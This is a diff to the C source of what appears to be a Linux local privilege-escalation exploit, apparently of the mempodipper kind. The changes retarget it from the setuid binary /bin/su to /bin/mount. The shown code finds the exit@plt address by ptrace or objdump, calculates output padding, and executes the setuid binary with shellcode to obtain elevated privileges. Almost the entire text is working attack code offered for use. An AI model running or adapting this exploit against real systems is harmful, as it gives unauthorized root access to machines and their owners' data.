@@ -147,14 +147,14 @@ unsigned long ptrace_address()
 		}
 		close(fd[0]);
 		dup2(fd[1], 2);
-		execl("/bin/su", "su", "not-a-valid-user", NULL);
+		execl("/bin/mount", "mount", "not-a-valid-user", NULL);
 	}
 	return 0;
 }
 
 unsigned long objdump_address()
 {
-	FILE *command = popen("objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'", "r");
+	FILE *command = popen("objdump -d /bin/mount|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'", "r");
 	if (!command) {
 		perror("[-] popen");
 		return 0;
@@ -167,14 +167,14 @@ unsigned long objdump_address()
 
 unsigned long find_address()
 {
-	printf("[+] Ptracing su to find next instruction without reading binary.\n");
+	printf("[+] Ptracing mount to find next instruction without reading binary.\n");
 	unsigned long address = ptrace_address();
 	if (!address) {
 		printf("[-] Ptrace failed.\n");
-		printf("[+] Reading su binary with objdump to find exit@plt.\n");
+		printf("[+] Reading mount binary with objdump to find exit@plt.\n");
 		address = objdump_address();
 		if (address == ULONG_MAX || !address) {
-			printf("[-] Could not resolve /bin/su. Specify the exit@plt function address manually.\n");
+			printf("[-] Could not resolve /bin/mount. Specify the exit@plt function address manually.\n");
 			printf("[-] Usage: %s -o ADDRESS\n[-] Example: %s -o 0x402178\n", prog_name, prog_name);
 			exit(-1);
 		}
@@ -185,8 +185,8 @@ unsigned long find_address()
 
 int su_padding()
 {
-	printf("[+] Calculating su padding.\n");
-	FILE *command = popen("/bin/su this-user-does-not-exist 2>&1", "r");
+	printf("[+] Calculating mount padding.\n");
+	FILE *command = popen("/bin/mount this-user-does-not-exist 2>&1", "r");
 	if (!command) {
 		perror("[-] popen");
 		exit(1);
@@ -255,8 +255,8 @@ int parent(unsigned long address)
 #else
 #error "That platform is not supported."
 #endif
-		printf("[+] Executing su with shellcode.\n");
-		execl("/bin/su", "su", shellcode, NULL);
+		printf("[+] Executing mount with shellcode.\n");
+		execl("/bin/mount", "mount", shellcode, NULL);
 	} else {
 		char sock[32];
 		sprintf(sock, "%d", sockets[0]);
